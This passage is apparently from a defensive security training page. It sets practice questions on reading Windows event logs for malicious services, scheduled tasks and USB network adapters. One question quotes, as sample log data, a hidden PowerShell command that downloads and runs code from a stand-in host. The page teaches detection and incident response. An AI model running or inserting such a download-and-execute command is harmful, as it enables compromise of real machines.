    - **Do not trust VID/PID as identity.** Devices can lie; use them as a pattern, not proof.

## Practice questions { #quiz }

### Question 1

On a server you find this 7045 (System channel). The `Security UserID` resolves to `CORP\helpdesk.t2`. Which fields matter, what do they tell you, and what do you check next?

```text
ServiceName:  WinDefendUpd
ImagePath:    C:\Users\Public\Libraries\wdupd.exe
ServiceType:  user mode service
StartType:    auto start
AccountName:  LocalSystem
```

??? success "Answer and explanation"
    - `ServiceName` `WinDefendUpd` — imitates a security product name. Legitimate Defender components do not install a service with this name; a believable name proves nothing (T1036.004).
    - `ImagePath` `C:\Users\Public\Libraries\wdupd.exe` — a program in a **user-writable public folder**, not `Program Files` or `System32`. This is the strongest signal.
    - `StartType` `auto start` — starts at every boot: this is **persistence** (T1543.003), not a one-off remote command.
    - `AccountName` `LocalSystem` — the program will run with full control of the server.
    - `Security UserID` → `CORP\helpdesk.t2` — a help-desk account installing a service on a server is unusual in itself.

    **Next:** find the logon that created it (4624 on this server around the same time, its logon type and source IP; or 4697 with `SubjectLogonId` if enabled), the process that ran `sc.exe`/`New-Service` (4688), how `wdupd.exe` got there (file creation, SMB copy 5145), whether it already ran (7036, 4688 with parent `services.exe`), its hash and signer, and whether the same service name or file exists on other hosts. Treat the help-desk account as compromised until proven otherwise.

### Question 2

A 4698 on `WS-031` shows `TaskName` `\GoogleUpdateTaskMachineCore{4A1F}`, Subject `CORP\j.lee` (logon type 2), and inside `TaskContent`: a `<LogonTrigger>`, a `<Repetition>` with `<Interval>PT30M</Interval>`, `<Command>powershell.exe</Command>` and `<Arguments>-w hidden -nop -c "iex (iwr https://cdn-sync.example/u.txt -UseBasicParsing)"</Arguments>`. Explain each part. Persistence or remote execution?

??? success "Answer and explanation"
    - `TaskName` — copies the naming style of a real browser updater task, so it blends into the task list (T1036.004). Real updater tasks run the vendor's updater `.exe`, not PowerShell.
    - Subject `CORP\j.lee` with logon type 2 — created by the logged-on user on that machine itself, not from the network. Likely the user's session ran something malicious (for example a phishing attachment).
    - `<LogonTrigger>` + `<Repetition>` `PT30M` — runs at every logon and then every 30 minutes: **persistence** (T1053.005), and it re-fetches the payload each time, so deleting the payload alone will not help.
    - `<Command>powershell.exe` with `-w hidden` (no window), `-nop` (no profile), `-c` (run this command), `iex (iwr ...)` — download text from a web address and **run it in memory** (T1059.001, T1105). The domain is the C2 / staging location.

    **Next:** block and search the domain in proxy/DNS logs across the estate, find the process that created the task (4688 around the 4698 time, its parent), check PowerShell script block logs (4104) for what was executed, look for the same task name elsewhere, and remove the task as part of containment — after collecting the evidence.

### Question 3

Your organisation blocks USB mass storage. A colleague says "so we don't need 6416". At 02:13 local time a 6416 on a domain controller shows `ClassName` `Net`, `DeviceDescription` `USB 10/100 LAN`, `CompatibleIds` containing `USB\Class_02`, and an unknown VID. What is the risk, and what does this tell you about the colleague's argument?

??? success "Answer and explanation"
    The device is a **USB network adapter** (class `Net`, USB class 02 = communications). Plugged into a **domain controller** at 2 a.m., it could give an attacker a new network path to the most important server — bypassing network controls — or be a small implant computer acting as a network card (T1200, Hardware Additions). The storage block does nothing here, because the device is not storage.

    The colleague is wrong: blocking storage covers only one class. Keystroke-injection devices appear as `HIDClass` keyboards and implants as `Net` devices; both get through a storage-only block. 6416 (with *Plug and Play Events* enabled) is how you see them. **Next:** check physical access logs and cameras for the server room, who was logged on (6416's subject is always the system), new network interfaces and IP addresses on the DC, any traffic through the new interface, and then remove and examine the device. Longer term: alert on any new `Net` or `HIDClass` device on servers and keep a VID/PID allow list.

## Related { #related }

- [Important Events](index.md) — this section's overview
- [Login events](logins.md) — the logon behind `SubjectLogonId` and `Security UserID`
- [Process creation events](process-creation.md) — what the service or task actually ran (parent `services.exe` / `svchost.exe`)
- [Firewall and object access events](firewall-object-access.md) — registry auditing (4657) for modified services and Run keys
- [Windows event structure and channels](../windows-logging/event-structure-channels.md) — System vs Security channels, nested data
- [Execution, persistence and discovery](../endpoint-attacks/execution-persistence-discovery.md) — the attacker techniques recorded here
- [Lateral movement, collection and exfiltration](../endpoint-attacks/lateral-collection-exfil.md) — remote services, remote tasks, USB exfiltration
- [Application control, FIM and catching persistence](../endpoint-defense/appcontrol-fim-persistence.md) — the defensive side
- [SMB](../other-protocols/smb.md) — the `ADMIN$`/`C$` shares and `svcctl` pipe behind remote services
- [Windows Event IDs](../../../basics/windows-event-ids.md)
- [Registry keys](../../../windows/registry-keys.md)
